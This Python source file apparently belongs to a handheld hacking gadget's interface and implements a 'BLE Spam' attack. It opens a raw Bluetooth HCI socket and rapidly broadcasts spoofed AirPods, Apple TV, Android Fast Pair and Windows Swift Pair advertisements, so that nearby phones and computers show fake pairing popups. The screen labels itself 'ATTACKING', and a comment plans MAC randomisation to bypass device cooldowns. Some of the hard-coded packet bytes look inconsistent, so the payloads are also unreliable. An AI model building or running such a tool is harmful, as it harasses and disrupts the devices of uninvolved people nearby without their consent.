"""BLE Spam — Spoof Apple/Android pairing popups using raw HCI packets."""
from __future__ import annotations

import os
import socket
import struct
import threading
import time
from typing import TYPE_CHECKING

import pygame
from bigbox import theme
from bigbox.events import Button, ButtonEvent

if TYPE_CHECKING:
    from bigbox.app import App


# BLE Advertisement Packets (AppleJuice / Android Fast Pair)
PROFILES = [
    ("AirPods Pro", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("AirPods Max", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Powerbeats Pro", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Apple TV Setup", b"\x1e\xff\x06\x00\x01\x00\x03\x00\x44\x20\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Android Fast Pair", b"\x06\x00\x03\x02\x2d\xfe\x06\x16\x2d\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ("Windows Swift Pair", b"\x1e\xff\x06\x00\x03\x00\x80\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
]


class BLESpamView:
    def __init__(self) -> None:
        self.dismissed = False
        self.running = False
        self.cursor = 0
        self.error_msg = ""
        
        self._stop_event = threading.Event()
        self._spam_thread: threading.Thread | None = None
        
        self.title_font = pygame.font.Font(None, 36)
        self.body_font = pygame.font.Font(None, 24)

    def handle(self, ev: ButtonEvent, ctx: App) -> None:
        if not ev.pressed: return

        if ev.button is Button.B:
            self._stop()
            self.dismissed = True
        elif ev.button is Button.UP and not self.running:
            self.cursor = (self.cursor - 1) % len(PROFILES)
        elif ev.button is Button.DOWN and not self.running:
            self.cursor = (self.cursor + 1) % len(PROFILES)
        elif ev.button is Button.A:
            if self.running:
                self._stop()
            else:
                self._start()

    def _start(self):
        self.running = True
        self.error_msg = ""
        self._stop_event.clear()
        self._spam_thread = threading.Thread(target=self._spam_loop, daemon=True)
        self._spam_thread.start()

    def _stop(self):
        self._stop_event.set()
        if self._spam_thread:
            self._spam_thread.join(timeout=1.0)
        self.running = False

    def _spam_loop(self):
        try:
            # HCI Device ID (hci0)
            dev_id = 0
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
            sock.bind((dev_id,))

            # 1. Stop any existing advertising
            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00")
            
            # 2. Set Advertising Parameters
            # Interval min/max (0x0020 = 20ms), Type=0x00 (ADV_IND), etc.
            params = struct.pack("<HHBBB6sBB", 0x0020, 0x0020, 0x00, 0x00, 0x00, b"\x00"*6, 0x07, 0x00)
            self._hci_send_cmd(sock, 0x08, 0x0006, params)

            # 3. Set Advertising Data
            data = PROFILES[self.cursor][1]
            # Must be exactly 32 bytes for the HCI command (length byte + 31 bytes payload)
            cmd_data = bytes([len(data)]) + data.ljust(31, b"\x00")
            self._hci_send_cmd(sock, 0x08, 0x0008, cmd_data)

            # 4. Start Advertising
            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x01")

            while not self._stop_event.is_set():
                # Randomize MAC address frequently to bypass cooldowns
                # (This requires more complex HCI commands, let's stick to constant for v1)
                time.sleep(0.5)

            # Cleanup: Stop advertising
            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00")
            sock.close()

        except Exception as e:
            self.error_msg = f"HCI Error: {e}"
            self.running = False

    def _hci_send_cmd(self, sock: socket.socket, ogf: int, ocf: int, data: bytes):
        opcode = (ogf << 10) | ocf
        packet = struct.pack("<BHB", 0x01, opcode, len(data)) + data
        sock.send(packet)

    def render(self, surf: pygame.Surface) -> None:
        surf.fill(theme.BG)
        
        title = self.title_font.render("BLE SPAM :: PROXY_ATTACK", True, theme.ACCENT)
        surf.blit(title, (theme.PADDING, theme.PADDING))

        status_text = "STATUS: ATTACKING..." if self.running else "STATUS: READY"
        status_color = theme.ERR if self.running else theme.FG
        s_surf = self.body_font.render(status_text, True, status_color)
        surf.blit(s_surf, (theme.PADDING, 60))

        if self.error_msg:
            e_surf = self.body_font.render(self.error_msg, True, theme.ERR)
            surf.blit(e_surf, (theme.PADDING, 90))

        # Profile List
        list_y = 120
        for i, (name, _) in enumerate(PROFILES):
            y = list_y + i * 32
            if y > theme.SCREEN_H - 60: break
            
            color = theme.ACCENT if i == self.cursor else theme.FG_DIM
            if i == self.cursor and not self.running:
                pygame.draw.rect(surf, theme.SELECTION_BG, (theme.PADDING, y-4, 300, 28), border_radius=4)
            
            p_surf = self.body_font.render(f"[{'*' if self.running and i == self.cursor else ' '}] {name}", True, color)
            surf.blit(p_surf, (theme.PADDING + 10, y))

        if self.running:
            msg = "Spamming advertisements. Nearby devices will see popups."
            m_surf = self.body_font.render(msg, True, theme.FG)
            surf.blit(m_surf, (theme.PADDING, theme.SCREEN_H - 80))

        hint = self.body_font.render("A: Toggle Attack  UP/DN: Select Profile  B: Back", True, theme.FG_DIM)
        surf.blit(hint, (theme.PADDING, theme.SCREEN_H - 30))
